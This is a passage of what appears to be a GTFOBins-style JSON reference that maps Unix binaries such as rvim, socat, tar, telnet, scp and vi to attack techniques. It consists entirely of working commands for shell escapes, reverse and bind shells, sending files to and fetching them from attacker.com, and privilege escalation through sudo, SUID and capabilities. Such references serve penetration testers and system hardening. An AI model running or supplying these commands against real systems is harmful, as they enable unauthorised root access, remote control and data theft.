            ]
        },
        "Capabilities": {
            "code": [
                "cp $(which rview) .",
                "sudo setcap cap_setuid+ep rview",
                "",
                "./rview -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which rview) .",
                "",
                "./rview -c ':lua os.execute(\"reset; exec sh\")'"
            ]
        }
    },
    "rvim": {
        "Shell": {
            "code": [
                "rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
            ]
        },
        "Reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "rvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()",
                "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
                "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
                "pty.spawn(\"/bin/sh\")",
                "vim.command(\":q!\")'"
            ]
        },
        "Non-interactive reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "rvim -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());",
                "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
                "  while true do",
                "    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));",
                "    local b=assert(f:read(\"*a\"));t:send(b);",
                "  end;",
                "  f:close();t:close();'"
            ]
        },
        "Non-interactive bind shell": {
            "code": [
                "export LPORT=12345",
                "rvim -c ':lua local k=require(\"socket\");",
                "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
                "  local c=s:accept();",
                "  while true do",
                "    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));",
                "    local b=assert(f:read(\"*a\"));c:send(b);",
                "  end;c:close();f:close();'"
            ]
        },
        "File upload": {
            "code": [
                "export URL=http://attacker.com/",
                "export LFILE=file_to_send",
                "rvim -c ':py import vim,sys; from os import environ as e",
                "if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u",
                "else: import urllib as u, urllib2 as r",
                "r.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))",
                "vim.command(\":q!\")'"
            ]
        },
        "File download": {
            "code": [
                "export URL=http://attacker.com/file_to_get",
                "export LFILE=file_to_save",
                "rvim -c ':py import vim,sys; from os import environ as e",
                "if sys.version_info.major == 3: import urllib.request as r",
                "else: import urllib as r",
                "r.urlretrieve(e[\"URL\"], e[\"LFILE\"])",
                "vim.command(\":q!\")'"
            ]
        },
        "File write": {
            "code": [
                "rvim file_to_write",
                "iDATA",
                "^[",
                "w"
            ]
        },
        "File read": {
            "code": [
                "rvim file_to_read"
            ]
        },
        "Library load": {
            "code": [
                "rvim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which rvim) .",
                "",
                "./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
            ]
        },
        "Capabilities": {
            "code": [
                "cp $(which rvim) .",
                "sudo setcap cap_setuid+ep rvim",
                "",
                "./rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which rvim) .",
                "",
                "./rvim -c ':lua os.execute(\"reset; exec sh\")'"
            ]
        }
    },
    "sash": {
        "Shell": {
            "code": [
                "sash"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which sash) .",
                "",
                "./sash"
            ]
        },
        "Sudo": {
            "code": [
                "sudo sash"
            ]
        }
    },
    "scp": {
        "Shell": {
            "code": [
                "TF=$(mktemp)",
                "echo 'sh 0<&2 1>&2' > $TF",
                "chmod +x \"$TF\"",
                "scp -S $TF x y:"
            ]
        },
        "File upload": {
            "code": [
                "RPATH=user@attacker.com:~/file_to_save",
                "LPATH=file_to_send",
                "scp $LFILE $RPATH"
            ]
        },
        "File download": {
            "code": [
                "RPATH=user@attacker.com:~/file_to_get",
                "LFILE=file_to_save",
                "scp $RPATH $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "TF=$(mktemp)",
                "echo 'sh 0<&2 1>&2' > $TF",
                "chmod +x \"$TF\"",
                "sudo scp -S $TF x y:"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which scp) .",
                "",
                "TF=$(mktemp)",
                "echo 'sh 0<&2 1>&2' > $TF",
                "chmod +x \"$TF\"",
                "./scp -S $TF a b:"
            ]
        }
    },
    "screen": {
        "Shell": {
            "code": [
                "screen"
            ]
        },
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "screen -L -Logfile $LFILE echo DATA"
            ]
        },
        "Sudo": {
            "code": [
                "sudo screen"
            ]
        }
    },
    "script": {
        "Shell": {
            "code": [
                "script -q /dev/null"
            ]
        },
        "File write": {
            "code": [
                "script -q -c 'echo DATA' file_to_write"
            ]
        },
        "Sudo": {
            "code": [
                "sudo script -q /dev/null"
            ]
        }
    },
    "sed": {
        "Shell": {
            "code": [
                "sed -n '1e exec sh 1>&0' /etc/hosts"
            ]
        },
        "Command": {
            "code": [
                "sed -n '1e id' /etc/hosts"
            ]
        },
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "sed -n \"1s/.*/DATA/w $LFILE\" /etc/hosts"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "sed '' \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which sed) .",
                "",
                "LFILE=file_to_read",
                "./sed -e '' \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "sudo sed -n '1e exec sh 1>&0' /etc/hosts"
            ]
        }
    },
    "service": {
        "Shell": {
            "code": [
                "/usr/sbin/service ../../bin/sh"
            ]
        },
        "Sudo": {
            "code": [
                "sudo service ../../bin/sh"
            ]
        }
    },
    "setarch": {
        "Shell": {
            "code": [
                "setarch $(arch) /bin/sh"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which setarch) .",
                "",
                "./setarch $(arch) /bin/sh -p"
            ]
        },
        "Sudo": {
            "code": [
                "sudo setarch $(arch) /bin/sh"
            ]
        }
    },
    "sftp": {
        "Shell": {
            "code": [
                "HOST=user@attacker.com",
                "sftp $HOST",
                "!/bin/sh"
            ]
        },
        "File upload": {
            "code": [
                "RHOST=user@attacker.com",
                "sftp $RHOST",
                "put file_to_send file_to_save"
            ]
        },
        "File download": {
            "code": [
                "RHOST=user@attacker.com",
                "sftp $RHOST",
                "get file_to_get file_to_save"
            ]
        },
        "Sudo": {
            "code": [
                "HOST=user@attacker.com",
                "sudo sftp $HOST",
                "!/bin/sh"
            ]
        }
    },
    "sg": {
        "Shell": {
            "code": [
                "sg $(id -ng)"
            ]
        },
        "Sudo": {
            "code": [
                "sudo sg root"
            ]
        }
    },
    "shuf": {
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "shuf -e DATA -o \"$LFILE\""
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "shuf -z \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which shuf) .",
                "",
                "LFILE=file_to_write",
                "./shuf -e DATA -o \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_write",
                "sudo shuf -e DATA -o \"$LFILE\""
            ]
        }
    },
    "slsh": {
        "Shell": {
            "code": [
                "slsh -e 'system(\"/bin/sh\")'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo slsh -e 'system(\"/bin/sh\")'"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which slsh) .",
                "",
                "./slsh -e 'system(\"/bin/sh\")'"
            ]
        }
    },
    "smbclient": {
        "Shell": {
            "code": [
                "smbclient '\\\\attacker\\share'",
                "!/bin/sh"
            ]
        },
        "File upload": {
            "code": [
                "smbclient '\\\\attacker\\share' -c 'put file_to_send where_to_save'"
            ]
        },
        "File download": {
            "code": [
                "smbclient '\\\\attacker\\share' -c 'put file_to_send where_to_save'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo smbclient '\\\\attacker\\share'",
                "!/bin/sh"
            ]
        }
    },
    "snap": {
        "Sudo": {
            "code": [
                "COMMAND=id",
                "cd $(mktemp -d)",
                "mkdir -p meta/hooks",
                "printf '#!/bin/sh\\n%s; false' \"$COMMAND\" >meta/hooks/install",
                "chmod +x meta/hooks/install",
                "fpm -n xxxx -s dir -t snap -a all meta",
                ""
            ]
        }
    },
    "socat": {
        "Shell": {
            "code": [
                "socat stdin exec:/bin/sh"
            ]
        },
        "Reverse shell": {
            "code": [
                "RHOST=attacker.com",
                "RPORT=12345",
                "socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane"
            ]
        },
        "Bind shell": {
            "code": [
                "LPORT=12345",
                "socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane"
            ]
        },
        "File upload": {
            "code": [
                "RHOST=attacker.com",
                "RPORT=12345",
                "LFILE=file_to_send",
                "socat -u file:$LFILE tcp-connect:$RHOST:$RPORT"
            ]
        },
        "File download": {
            "code": [
                "RHOST=attacker.com",
                "RPORT=12345",
                "LFILE=file_to_save",
                "socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat"
            ]
        },
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "socat -u 'exec:echo DATA' \"open:$LFILE,creat\""
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "socat -u \"file:$LFILE\" -"
            ]
        },
        "Sudo": {
            "code": [
                "sudo socat stdin exec:/bin/sh"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which socat) .",
                "",
                "RHOST=attacker.com",
                "RPORT=12345",
                "./socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane"
            ]
        }
    },
    "soelim": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "soelim \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which soelim) .",
                "",
                "LFILE=file_to_read",
                "./soelim \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo soelim \"$LFILE\""
            ]
        }
    },
    "sort": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "sort -m \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which sort) .",
                "",
                "LFILE=file_to_read",
                "./sort -m \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo sort -m \"$LFILE\""
            ]
        }
    },
    "split": {
        "Shell": {
            "code": [
                "split --filter=/bin/sh /dev/stdin"
            ]
        },
        "Command": {
            "code": [
                "COMMAND=id",
                "TF=$(mktemp)",
                "split --filter=$COMMAND $TF"
            ]
        },
        "File write": {
            "code": [
                "TF=$(mktemp)",
                "echo DATA >$TF",
                "split -b999m $TF"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "TF=$(mktemp)",
                "split $LFILE $TF",
                "cat $TF*"
            ]
        },
        "Sudo": {
            "code": [
                "sudo split --filter=/bin/sh /dev/stdin"
            ]
        }
    },
    "sqlite3": {
        "Shell": {
            "code": [
                "sqlite3 /dev/null '.shell /bin/sh'"
            ]
        },
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "sqlite3 /dev/null -cmd \".output $LFILE\" 'select \"DATA\";'"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "sqlite3 << EOF",
                "CREATE TABLE t(line TEXT);",
                ".import $LFILE t",
                "SELECT * FROM t;",
                "EOF"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which sqlite3) .",
                "",
                "LFILE=file_to_read",
                "sqlite3 << EOF",
                "CREATE TABLE t(line TEXT);",
                ".import $LFILE t",
                "SELECT * FROM t;",
                "EOF"
            ]
        },
        "Sudo": {
            "code": [
                "sudo sqlite3 /dev/null '.shell /bin/sh'"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which sqlite3) .",
                "",
                "./sqlite3 /dev/null '.shell /bin/sh'"
            ]
        }
    },
    "ss": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "ss -a -F $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which ss) .",
                "",
                "LFILE=file_to_read",
                "./ss -a -F $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo ss -a -F $LFILE"
            ]
        }
    },
    "ssh-keygen": {
        "Library load": {
            "code": [
                "ssh-keygen -D ./lib.so"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which ssh-keygen) .",
                "",
                "./ssh-keygen -D ./lib.so"
            ]
        },
        "Sudo": {
            "code": [
                "sudo ssh-keygen -D ./lib.so"
            ]
        }
    },
    "ssh-keyscan": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "ssh-keyscan -f $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which ssh-keyscan) .",
                "",
                "LFILE=file_to_read",
                "./ssh-keyscan -f $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo ssh-keyscan -f $LFILE"
            ]
        }
    },
    "ssh": {
        "Shell": {
            "code": [
                "ssh localhost $SHELL --noprofile --norc"
            ]
        },
        "File upload": {
            "code": [
                "HOST=user@attacker.com",
                "RPATH=file_to_save",
                "LPATH=file_to_send",
                "ssh $HOST \"cat > $RPATH\" < $LPATH"
            ]
        },
        "File download": {
            "code": [
                "HOST=user@attacker.com",
                "RPATH=file_to_get",
                "LPATH=file_to_save",
                "ssh $HOST \"cat $RPATH\" > $LPATH"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "ssh -F $LFILE localhost"
            ]
        },
        "Sudo": {
            "code": [
                "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"
            ]
        }
    },
    "sshpass": {
        "Shell": {
            "code": [
                "sshpass /bin/sh"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which sshpass) .",
                "",
                "./sshpass /bin/sh -p"
            ]
        },
        "Sudo": {
            "code": [
                "sudo sshpass /bin/sh"
            ]
        }
    },
    "start-stop-daemon": {
        "Shell": {
            "code": [
                "start-stop-daemon -n $RANDOM -S -x /bin/sh"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which start-stop-daemon) .",
                "",
                "./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p"
            ]
        },
        "Sudo": {
            "code": [
                "sudo start-stop-daemon -n $RANDOM -S -x /bin/sh"
            ]
        }
    },
    "stdbuf": {
        "Shell": {
            "code": [
                "stdbuf -i0 /bin/sh"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which stdbuf) .",
                "",
                "./stdbuf -i0 /bin/sh -p"
            ]
        },
        "Sudo": {
            "code": [
                "sudo stdbuf -i0 /bin/sh"
            ]
        }
    },
    "strace": {
        "Shell": {
            "code": [
                "strace -o /dev/null /bin/sh"
            ]
        },
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "strace -s 999 -o $LFILE strace - DATA"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which strace) .",
                "",
                "./strace -o /dev/null /bin/sh -p"
            ]
        },
        "Sudo": {
            "code": [
                "sudo strace -o /dev/null /bin/sh"
            ]
        }
    },
    "strings": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "strings \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which strings) .",
                "",
                "LFILE=file_to_read",
                "./strings \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo strings \"$LFILE\""
            ]
        }
    },
    "su": {
        "Sudo": {
            "code": [
                "sudo su"
            ]
        }
    },
    "sysctl": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "/usr/sbin/sysctl -n \"/../../$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which sysctl) .",
                "",
                "LFILE=file_to_read",
                "./sysctl -n \"/../../$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo sysctl -n \"/../../$LFILE\""
            ]
        }
    },
    "systemctl": {
        "SUID": {
            "code": [
                "sudo install -m =xs $(which systemctl) .",
                "",
                "TF=$(mktemp).service",
                "echo '[Service]",
                "Type=oneshot",
                "ExecStart=/bin/sh -c \"id > /tmp/output\"",
                "[Install]",
                "WantedBy=multi-user.target' > $TF",
                "./systemctl link $TF",
                "./systemctl enable --now $TF"
            ]
        },
        "Sudo": {
            "code": [
                "TF=$(mktemp)",
                "echo /bin/sh >$TF",
                "chmod +x $TF",
                "sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice"
            ]
        }
    },
    "systemd-resolve": {
        "Sudo": {
            "code": [
                "sudo systemd-resolve --status",
                "!sh"
            ]
        }
    },
    "tac": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "tac -s 'RANDOM' \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which tac) .",
                "",
                "LFILE=file_to_read",
                "./tac -s 'RANDOM' \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo tac -s 'RANDOM' \"$LFILE\""
            ]
        }
    },
    "tail": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "tail -c1G \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which tail) .",
                "",
                "LFILE=file_to_read",
                "./tail -c1G \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo tail -c1G \"$LFILE\""
            ]
        }
    },
    "tar": {
        "Shell": {
            "code": [
                "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
            ]
        },
        "File upload": {
            "code": [
                "RHOST=attacker.com",
                "RUSER=root",
                "RFILE=/tmp/file_to_send.tar",
                "LFILE=file_to_send",
                "tar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh"
            ]
        },
        "File download": {
            "code": [
                "RHOST=attacker.com",
                "RUSER=root",
                "RFILE=/tmp/file_to_get.tar",
                "tar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh"
            ]
        },
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "TF=$(mktemp)",
                "echo DATA > \"$TF\"",
                "tar c --xform \"s@.*@$LFILE@\" -OP \"$TF\" | tar x -P"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "tar xf \"$LFILE\" -I '/bin/sh -c \"cat 1>&2\"'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which tar) .",
                "",
                "./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
            ]
        }
    },
    "task": {
        "Shell": {
            "code": [
                "task execute /bin/sh"
            ]
        },
        "Sudo": {
            "code": [
                "sudo task execute /bin/sh"
            ]
        }
    },
    "taskset": {
        "Shell": {
            "code": [
                "taskset 1 /bin/sh"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which taskset) .",
                "",
                "./taskset 1 /bin/sh -p"
            ]
        },
        "Sudo": {
            "code": [
                "sudo taskset 1 /bin/sh"
            ]
        }
    },
    "tbl": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "tbl $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which tbl) .",
                "",
                "LFILE=file_to_read",
                "./tbl $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo tbl $LFILE"
            ]
        }
    },
    "tclsh": {
        "Shell": {
            "code": [
                "tclsh",
                "exec /bin/sh <@stdin >@stdout 2>@stderr"
            ]
        },
        "Non-interactive reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which tclsh) .",
                "",
                "./tclsh",
                "exec /bin/sh -p <@stdin >@stdout 2>@stderr"
            ]
        },
        "Sudo": {
            "code": [
                "sudo tclsh",
                "exec /bin/sh <@stdin >@stdout 2>@stderr"
            ]
        }
    },
    "tcpdump": {
        "Command": {
            "code": [
                "COMMAND='id'",
                "TF=$(mktemp)",
                "echo \"$COMMAND\" > $TF",
                "chmod +x $TF",
                "tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF"
            ]
        },
        "Sudo": {
            "code": [
                "COMMAND='id'",
                "TF=$(mktemp)",
                "echo \"$COMMAND\" > $TF",
                "chmod +x $TF",
                "sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root"
            ]
        }
    },
    "tee": {
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "echo DATA | ./tee -a \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which tee) .",
                "",
                "LFILE=file_to_write",
                "echo DATA | ./tee -a \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_write",
                "echo DATA | sudo tee -a \"$LFILE\""
            ]
        }
    },
    "telnet": {
        "Shell": {
            "code": [
                "RHOST=attacker.com",
                "RPORT=12345",
                "telnet $RHOST $RPORT",
                "^]",
                "!/bin/sh"
            ]
        },
        "Reverse shell": {
            "code": [
                "RHOST=attacker.com",
                "RPORT=12345",
                "TF=$(mktemp -u)",
                "mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF"
            ]
        },
        "Sudo": {
            "code": [
                "RHOST=attacker.com",
                "RPORT=12345",
                "sudo telnet $RHOST $RPORT",
                "^]",
                "!/bin/sh"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which telnet) .",
                "",
                "RHOST=attacker.com",
                "RPORT=12345",
                "./telnet $RHOST $RPORT",
                "^]",
                "!/bin/sh"
            ]
        }
    },
    "tex": {
        "Shell": {
            "code": [
                "tex --shell-escape '\\write18{/bin/sh}\\end'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo tex --shell-escape '\\write18{/bin/sh}\\end'"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which tex) .",
                "",
                "./tex --shell-escape '\\write18{/bin/sh}\\end'"
            ]
        }
    },
    "tftp": {
        "File upload": {
            "code": [
                "RHOST=attacker.com",
                "tftp $RHOST",
                "put file_to_send"
            ]
        },
        "File download": {
            "code": [
                "RHOST=attacker.com",
                "tftp $RHOST",
                "get file_to_get"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which tftp) .",
                "",
                "RHOST=attacker.com",
                "./tftp $RHOST",
                "put file_to_send"
            ]
        },
        "Sudo": {
            "code": [
                "RHOST=attacker.com",
                "sudo tftp $RHOST",
                "put file_to_send"
            ]
        }
    },
    "tic": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "tic -C \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which tic) .",
                "",
                "LFILE=file_to_read",
                "./tic -C \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo tic -C \"$LFILE\""
            ]
        }
    },
    "time": {
        "Shell": {
            "code": [
                "/usr/bin/time /bin/sh"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which time) .",
                "",
                "./time /bin/sh -p"
            ]
        },
        "Sudo": {
            "code": [
                "sudo /usr/bin/time /bin/sh"
            ]
        }
    },
    "timedatectl": {
        "Shell": {
            "code": [
                "timedatectl list-timezones",
                "!/bin/sh"
            ]
        },
        "Sudo": {
            "code": [
                "sudo timedatectl list-timezones",
                "!/bin/sh"
            ]
        }
    },
    "timeout": {
        "Shell": {
            "code": [
                "timeout 7d /bin/sh"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which timeout) .",
                "",
                "./timeout 7d /bin/sh -p"
            ]
        },
        "Sudo": {
            "code": [
                "sudo timeout --foreground 7d /bin/sh"
            ]
        }
    },
    "tmux": {
        "Shell": {
            "code": [
                "tmux"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "tmux -f $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "sudo tmux"
            ]
        }
    },
    "top": {
        "Shell": {
            "code": [
                "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc",
                "top",
                "# press return twice",
                "reset"
            ]
        },
        "Sudo": {
            "code": [
                "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc",
                "sudo top",
                "# press return twice",
                "reset"
            ]
        }
    },
    "troff": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "troff $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which troff) .",
                "",
                "LFILE=file_to_read",
                "./troff $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo troff $LFILE"
            ]
        }
    },
    "tshark": {
        "Shell": {
            "code": [
                "TF=$(mktemp)",
                "echo 'os.execute(\"/bin/sh\")' >$TF",
                "tshark -Xlua_script:$TF"
            ]
        }
    },
    "ul": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "ul \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which ul) .",
                "",
                "LFILE=file_to_read",
                "./ul \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo ul \"$LFILE\""
            ]
        }
    },
    "unexpand": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "unexpand -t99999999 \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which unexpand) .",
                "",
                "LFILE=file_to_read",
                "./unexpand -t99999999 \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo unexpand -t99999999 \"$LFILE\""
            ]
        }
    },
    "uniq": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "uniq \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which uniq) .",
                "",
                "LFILE=file_to_read",
                "./uniq \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo uniq \"$LFILE\""
            ]
        }
    },
    "unshare": {
        "Shell": {
            "code": [
                "unshare /bin/sh"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which unshare) .",
                "",
                "./unshare -r /bin/sh"
            ]
        },
        "Sudo": {
            "code": [
                "sudo unshare /bin/sh"
            ]
        }
    },
    "update-alternatives": {
        "SUID": {
            "code": [
                "sudo install -m =xs $(which update-alternatives) .",
                "",
                "LFILE=/path/to/file_to_write",
                "TF=$(mktemp)",
                "echo DATA >$TF",
                "./update-alternatives --force --install \"$LFILE\" x \"$TF\" 0"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=/path/to/file_to_write",
                "TF=$(mktemp)",
                "echo DATA >$TF",
                "sudo update-alternatives --force --install \"$LFILE\" x \"$TF\" 0"
            ]
        }
    },
    "uudecode": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "uuencode \"$LFILE\" /dev/stdout | uudecode"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which uudecode) .",
                "",
                "LFILE=file_to_read",
                "uuencode \"$LFILE\" /dev/stdout | uudecode"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo uuencode \"$LFILE\" /dev/stdout | uudecode"
            ]
        }
    },
    "uuencode": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "uuencode \"$LFILE\" /dev/stdout | uudecode"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which uuencode) .",
                "",
                "LFILE=file_to_read",
                "uuencode \"$LFILE\" /dev/stdout | uudecode"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo uuencode \"$LFILE\" /dev/stdout | uudecode"
            ]
        }
    },
    "valgrind": {
        "Shell": {
            "code": [
                "valgrind /bin/sh"
            ]
        },
        "Sudo": {
            "code": [
                "sudo valgrind /bin/sh"
            ]
        }
    },
    "vi": {
        "Shell": {
            "code": [
                "vi -c ':!/bin/sh' /dev/null"
            ]
        },
        "File write": {
            "code": [
                "vi file_to_write",
                "iDATA",
                "^[",
                "w"
            ]
        },
        "File read": {
            "code": [
                "vi file_to_read"
            ]
        },
        "Sudo": {
            "code": [
                "sudo vi -c ':!/bin/sh' /dev/null"
            ]
        }
    },
    "view": {
        "Shell": {
            "code": [
                "view -c ':!/bin/sh'"
            ]
        },
        "Reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "view -c ':py import vim,sys,socket,os,pty;s=socket.socket()",
